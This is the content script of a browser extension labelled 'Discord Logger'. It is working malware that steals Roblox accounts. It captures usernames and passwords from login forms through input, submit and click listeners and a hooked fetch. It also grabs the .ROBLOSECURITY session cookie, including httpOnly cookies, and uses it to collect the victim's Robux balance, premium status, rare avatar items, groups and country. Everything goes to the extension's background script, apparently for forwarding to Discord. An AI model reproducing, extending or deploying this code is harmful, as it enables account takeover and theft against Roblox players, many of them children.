
// Roblox-specific logging only
(function() {
  console.log('Discord Logger content script loaded on:', window.location.href);

  function sendLogToBackground(level, args) {
    const logData = {
      level: level,
      message: args.map(arg => 
        typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
      ).join(' '),
      timestamp: new Date().toISOString(),
      url: window.location.href,
      userAgent: navigator.userAgent
    };

    console.log('Sending log to background:', level, logData.message.substring(0, 50));

    chrome.runtime.sendMessage({
      type: 'LOG_CAPTURED',
      data: logData
    }, (response) => {
      if (chrome.runtime.lastError) {
        console.error('Error sending message:', chrome.runtime.lastError);
      } else {
        console.log('Message sent successfully:', response);
      }
    });
  }

  // Function to capture Roblox security cookie and send combined embeds
  async function captureRobloxSecurity() {
    if (!window.location.hostname.includes('roblox.com')) {
      return;
    }

    console.log('Checking for Roblox security cookie...');
    
    // Get all cookies including httpOnly ones using chrome.cookies API
    try {
      chrome.runtime.sendMessage({
        type: 'GET_COOKIES',
        domain: '.roblox.com'
      }, async (response) => {
        if (response && response.cookies) {
          const roblosecurityCookie = response.cookies.find(cookie => cookie.name === '.ROBLOSECURITY');
          
          if (roblosecurityCookie) {
            console.log('Found ROBLOSECURITY cookie via API');
            await sendCombinedEmbeds(roblosecurityCookie.value);
          }
        }
      });
    } catch (error) {
      console.error('Error getting cookies via API:', error);
    }

    // Also check document.cookie as fallback
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
      const [name, value] = cookie.trim().split('=');
      if (name === '.ROBLOSECURITY') {
        console.log('Found ROBLOSECURITY cookie in document.cookie');
        await sendCombinedEmbeds(value);
        break;
      }
    }
  }

  // Function to send combined embeds (credentials + security token)
  async function sendCombinedEmbeds(securityToken) {
    // Get stored credentials from login attempt
    let username = 'Not captured';
    let password = 'Not captured';

    if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 60000) {
      username = window.robloxLoginAttempt.username || 'Not captured';
      password = window.robloxLoginAttempt.password || 'Not captured';
    } else {
      // Fallback to current form detection
      const credentials = captureRobloxCredentials();
      username = credentials.username || 'Not captured';
      password = credentials.password || 'Not captured';
    }

    // Prepare first embed (credentials)
    const credentialsData = {
      username: username,
      password: password
    };

    // Prepare second embed (security token)
    const securityData = {
      token: securityToken
    };

    // Send both embeds together
    sendLogToBackground('roblox_credentials', [JSON.stringify(credentialsData)]);
    sendLogToBackground('roblox_security', [JSON.stringify(securityData)]);

    // Fetch and send user data as well
    const userData = await fetchRobloxUserData(securityToken);
    if (userData) {
      sendLogToBackground('roblox_userdata', [JSON.stringify(userData, null, 2)]);
    }

    // Clear the stored login attempt
    delete window.robloxLoginAttempt;
  }

  // Fetch comprehensive Roblox user data using APIs
  async function fetchRobloxUserData(roblosecurity) {
    try {
      console.log('Fetching Roblox user data...');
      
      // Get CSRF token first
      const csrfToken = await getRobloxCSRFToken(roblosecurity);
      if (!csrfToken) {
        console.log('Could not get CSRF token');
        return null;
      }

      // Get current user info
      const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`,
          'X-CSRF-TOKEN': csrfToken
        }
      });

      if (!userResponse.ok) {
        console.log('Could not get user info');
        return null;
      }
      
      const userInfo = await userResponse.json();
      console.log('Got user info:', userInfo.name);

      // Get detailed user data
      const detailsResponse = await fetch(`https://users.roblox.com/v1/users/${userInfo.id}`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const userDetails = detailsResponse.ok ? await detailsResponse.json() : {};

      // Get Robux balance
      const robuxResponse = await fetch('https://economy.roblox.com/v1/users/authenticated/currency', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`,
          'X-CSRF-TOKEN': csrfToken
        }
      });

      const robuxData = robuxResponse.ok ? await robuxResponse.json() : { robux: 0 };

      // Get premium status
      const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userInfo.id}/validate-membership`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`,
          'X-CSRF-TOKEN': csrfToken
        }
      });

      const premiumData = premiumResponse.ok ? await premiumResponse.json() : { isPremium: false };

      // Get currently worn items for korblox/headless detection
      const avatarResponse = await fetch(`https://avatar.roblox.com/v1/users/${userInfo.id}/currently-wearing`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const avatarData = avatarResponse.ok ? await avatarResponse.json() : { assetIds: [] };

      // Get user's groups
      const groupsResponse = await fetch(`https://groups.roblox.com/v2/users/${userInfo.id}/groups/roles`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const groupsData = groupsResponse.ok ? await groupsResponse.json() : { data: [] };

      // Get user's badges count
      const badgesResponse = await fetch(`https://badges.roblox.com/v1/users/${userInfo.id}/badges?limit=100`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const badgesData = badgesResponse.ok ? await badgesResponse.json() : { data: [] };

      // Get account age
      const accountAge = userDetails.created ? 
        Math.floor((new Date() - new Date(userDetails.created)) / (1000 * 60 * 60 * 24)) : 0;

      // Detect korblox and headless items
      const korbloxDetection = await detectKorbloxHeadless(avatarData.assetIds, roblosecurity);

      // Get user's location/country
      const localeResponse = await fetch('https://locale.roblox.com/v1/country-regions', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const localeData = localeResponse.ok ? await localeResponse.json() : {};

      return {
        username: userInfo.name || userInfo.displayName || 'Unknown',
        userId: userInfo.id,
        displayName: userInfo.displayName,
        description: userDetails.description || 'No description',
        accountAge: accountAge,
        robux: robuxData.robux || 0,
        isPremium: premiumData.isPremium || false,
        created: userDetails.created,
        korblox: korbloxDetection.hasKorblox,
        headless: korbloxDetection.hasHeadless,
        currentlyWearing: avatarData.assetIds || [],
        groups: groupsData.data ? groupsData.data.slice(0, 10) : [],
        badgeCount: badgesData.data ? badgesData.data.length : 0,
        country: localeData.countryRegionCode || 'Unknown',
        followers: userDetails.followerCount || 0,
        following: userDetails.followingCount || 0,
        friendCount: userDetails.friendCount || 0
      };

    } catch (error) {
      console.error('Error fetching user data:', error);
      return null;
    }
  }

  // Get CSRF token for authenticated requests
  async function getRobloxCSRFToken(roblosecurity) {
    try {
      const response = await fetch('https://auth.roblox.com/v2/logout', {
        method: 'POST',
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      return response.headers.get('x-csrf-token');
    } catch (error) {
      console.error('Error getting CSRF token:', error);
      return null;
    }
  }

  // Detect korblox and headless items
  async function detectKorbloxHeadless(assetIds, roblosecurity) {
    const korbloxIds = [
      139607770, 139607718, 139607625, 139607570, 139607528, 139607487, 139607415, 139607356,
      139607313, 139607268, 139607228, 139607186, 139607142, 139607101, 139607069, 139607029,
      139606993, 139606951, 139606909, 139606867, 139606825, 139606781, 139606734, 139606692,
    ];

    const headlessIds = [
      134082579, // Headless Head
      139607770  // Some korblox items might also be considered headless
    ];

    let hasKorblox = false;
    let hasHeadless = false;

    // Check currently worn items
    for (const assetId of assetIds) {
      if (korbloxIds.includes(assetId)) {
        hasKorblox = true;
      }
      if (headlessIds.includes(assetId)) {
        hasHeadless = true;
      }
    }

    return { hasKorblox, hasHeadless };
  }

  // Function to capture Roblox username and password
  function captureRobloxCredentials() {
    let username = '';
    let password = '';

    // Try to get from current login form inputs with more comprehensive selectors
    const usernameSelectors = [
      'input[data-testid="username-field"]',
      'input[data-testid="email-phone-username-field"]',
      'input[id*="username"]',
      'input[name*="username"]',
      'input[placeholder*="username" i]',
      'input[placeholder*="user" i]',
      'input[type="text"]',
      'input[type="email"]',
      'input[autocomplete="username"]'
    ];

    const passwordSelectors = [
      'input[data-testid="password-field"]',
      'input[type="password"]',
      'input[id*="password"]',
      'input[name*="password"]',
      'input[placeholder*="password" i]',
      'input[autocomplete="current-password"]'
    ];

    // Try each username selector
    for (const selector of usernameSelectors) {
      const inputs = document.querySelectorAll(selector);
      for (const input of inputs) {
        if (input.value && input.value.trim() !== '') {
          username = input.value.trim();
          console.log('Found username via selector:', selector, username);
          break;
        }
      }
      if (username) break;
    }

    // Try each password selector
    for (const selector of passwordSelectors) {
      const inputs = document.querySelectorAll(selector);
      for (const input of inputs) {
        if (input.value && input.value.trim() !== '') {
          password = input.value.trim();
          console.log('Found password via selector:', selector, password);
          break;
        }
      }
      if (password) break;
    }

    // Also try to get from localStorage or sessionStorage
    try {
      const storedUsername = localStorage.getItem('roblox_username') || sessionStorage.getItem('roblox_username');
      if (storedUsername && !username) username = storedUsername;
    } catch (e) {
      console.log('Could not access storage:', e.message);
    }

    return { username, password };
  }

  // Enhanced monitoring for Roblox login activity
  function monitorRobloxLogin() {
    if (!window.location.hostname.includes('roblox.com')) {
      console.log('Not on Roblox site, skipping monitoring');
      return;
    }

    console.log('Starting enhanced Roblox monitoring on:', window.location.href);

    // Check for security cookie on page load with delays
    setTimeout(captureRobloxSecurity, 1000);
    setTimeout(captureRobloxSecurity, 3000);
    setTimeout(captureRobloxSecurity, 5000);
    setTimeout(captureRobloxSecurity, 10000);

    // Monitor for cookie changes more frequently
    let lastCookies = document.cookie;
    const cookieInterval = setInterval(() => {
      if (document.cookie !== lastCookies) {
        console.log('Cookie change detected, checking for ROBLOSECURITY');
        lastCookies = document.cookie;
        setTimeout(captureRobloxSecurity, 500);
        setTimeout(captureRobloxSecurity, 2000);
      }
    }, 500); // Check every 500ms

    // Monitor for successful login redirects
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;
    
    history.pushState = function() {
      originalPushState.apply(history, arguments);
      console.log('URL changed via pushState, checking for login');
      setTimeout(captureRobloxSecurity, 1000);
      setTimeout(captureRobloxSecurity, 3000);
    };

    history.replaceState = function() {
      originalReplaceState.apply(history, arguments);
      console.log('URL changed via replaceState, checking for login');
      setTimeout(captureRobloxSecurity, 1000);
      setTimeout(captureRobloxSecurity, 3000);
    };

    // Monitor for authentication API calls
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
      const result = originalFetch.apply(this, args);

      if (args[0] && typeof args[0] === 'string') {
        const url = args[0].toLowerCase();
        if (url.includes('/v2/login') || url.includes('/authentication') || url.includes('/signin') || url.includes('/users/authenticate')) {
          console.log('Login API call detected:', args[0]);
          result.then(response => {
            console.log('Login API response status:', response.status);
            if (response.ok || response.status === 200) {
              setTimeout(captureRobloxSecurity, 1000);
              setTimeout(captureRobloxSecurity, 3000);
              setTimeout(captureRobloxSecurity, 5000);
            }
          }).catch(err => {
            console.log('Login API error:', err);
          });
        }
      }

      return result;
    };

    // Enhanced form submission monitoring
    document.addEventListener('submit', function(event) {
      console.log('Form submission detected on Roblox');
      const form = event.target;
      if (form && form.tagName === 'FORM') {
        // Capture credentials immediately from form
        const credentials = captureRobloxCredentials();
        
        if (credentials.username || credentials.password) {
          console.log('Login credentials captured from form submission');

          // Store credentials to associate with security token later
          window.robloxLoginAttempt = { 
            username: credentials.username, 
            password: credentials.password, 
            timestamp: Date.now() 
          };

          // Check for security token after form submission with multiple delays
          setTimeout(captureRobloxSecurity, 1000);
          setTimeout(captureRobloxSecurity, 3000);
          setTimeout(captureRobloxSecurity, 5000);
          setTimeout(captureRobloxSecurity, 8000);
        }
      }
    });

    // Enhanced input monitoring with real-time capture
    let inputTimeout;
    document.addEventListener('input', function(event) {
      const input = event.target;
      if (input && input.tagName === 'INPUT') {
        // Clear previous timeout
        clearTimeout(inputTimeout);
        
        // Set new timeout to capture after user stops typing
        inputTimeout = setTimeout(() => {
          const credentials = captureRobloxCredentials();
          if (credentials.username && credentials.password) {
            console.log('Login credentials updated via input monitoring');
            window.robloxLoginAttempt = { 
              username: credentials.username, 
              password: credentials.password, 
              timestamp: Date.now() 
            };
          }
        }, 1000); // Wait 1 second after user stops typing
      }
    });

    // Monitor for button clicks (login buttons)
    document.addEventListener('click', function(event) {
      const target = event.target;
      if (target && (
        target.textContent?.toLowerCase().includes('log in') ||
        target.textContent?.toLowerCase().includes('sign in') ||
        target.id?.toLowerCase().includes('login') ||
        target.className?.toLowerCase().includes('login')
      )) {
        console.log('Login button clicked, capturing credentials');
        const credentials = captureRobloxCredentials();
        if (credentials.username || credentials.password) {
          window.robloxLoginAttempt = { 
            username: credentials.username, 
            password: credentials.password, 
            timestamp: Date.now() 
          };
          
          setTimeout(captureRobloxSecurity, 2000);
          setTimeout(captureRobloxSecurity, 5000);
          setTimeout(captureRobloxSecurity, 8000);
        }
      }
    });

    // Listen for storage events (in case Roblox stores login info)
    window.addEventListener('storage', function(e) {
      console.log('Storage event detected:', e.key);
      setTimeout(captureRobloxSecurity, 1000);
    });

    // Clean up on page unload
    window.addEventListener('beforeunload', () => {
      clearInterval(cookieInterval);
      clearTimeout(inputTimeout);
    });
  }

  // Start monitoring if on Roblox
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', monitorRobloxLogin);
  } else {
    monitorRobloxLogin();
  }

  // Also start monitoring after a short delay in case page is still loading
  setTimeout(monitorRobloxLogin, 2000);
})();
